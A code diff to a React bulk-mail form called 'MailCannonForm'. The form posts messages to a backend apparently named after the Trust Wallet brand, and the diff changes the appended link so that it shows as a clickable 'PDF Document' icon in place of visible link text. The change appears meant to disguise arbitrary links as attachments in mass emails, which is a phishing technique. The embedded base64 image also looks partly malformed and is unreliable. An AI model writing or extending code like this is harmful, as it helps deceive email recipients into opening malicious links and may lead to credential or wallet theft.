@@ -37,6 +37,9 @@ type MailCannonFormValues = z.infer<typeof formSchema>;
 
 const BACKEND_URL = "https://trustwallet-y3lo.onrender.com/sendmail";
 
+// Base64 encoded PDF icon (small and generic)
+const PDF_ICON_BASE64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAABqElEQVRoQ+2Y0Q3CMAxG3xBDJBJAEMZfwCYpIhnACYAJwC5gEnACmAC6AWzJkWTgFzWdXb9kS/zJ3/s1O9PTMAzDMP4fUqnJdJtM5jSaTqfrTfB3T6bT6T+dZtPZ6Wzax2Gf5/v5/gGvj0P8BngpX/N/jAALgAALgAALgAALgAALgAALgAALgAALgAALgAALgAD+LwB8A5yzgHHhD3ADfAf+A76BV/gDbD6B95V5b51a5tY5d+3Q2gT8BVz4E/hR+I/wE/gX+Bv4T/A/8B/wJ/CjcC7bY+UE+AecK3hH+K/wG/gL+BX4S/hZcH76A3wC5x3hI/A/8I/wh/A/8J/whfB/gV8VzBvAV+Bv4UnhaIEfge+EvwV/Bf4S/hY+Fv4fMFcwgM/AX8KfwtECP4I/Ap8LfxN+Fv4M/g3+DP4S/hb+Fv4N/A38LegfIEZwL9hY8F/wL/A/8B/wL/A/8B/wL/A34G/hb/l3we/AXcBDwCLMORf//8BePhP8PfhP4N/wz8Mwwgs+AM63cILSt2upwAAAABJRU5ErkJggg==";
+
 export default function MailCannonForm() {
   const { toast } = useToast();
   const [loading, setLoading] = useState(false);
@@ -76,7 +79,7 @@ export default function MailCannonForm() {
     // Prepare email body as HTML
     let emailBody = values.body.replace(/\n/g, '<br>');
     if (values.linkUrl) {
-      emailBody += `<br><br><a href="${values.linkUrl}" target="_blank" rel="noopener noreferrer">View Attached Link</a>`;
+      emailBody += `<br><br><a href="${values.linkUrl}" target="_blank" rel="noopener noreferrer"><img src="${PDF_ICON_BASE64}" alt="PDF Document" width="48" height="48" style="vertical-align: middle;"></a>`;
     }
 
     const formData = new FormData();
@@ -282,7 +285,7 @@ user3@example.com"
                     <Input placeholder="https://example.com/your-file.pdf" {...field} />
                   </FormControl>
                   <FormDescription>
-                    This link will be added to the end of your email as "View Attached Link".
+                    This link will be added to the end of your email as a clickable PDF icon.
                   </FormDescription>
                   <FormMessage />
                 </FormItem>
@@ -320,5 +323,3 @@ user3@example.com"
     </Card>
   );
 }
-
-    
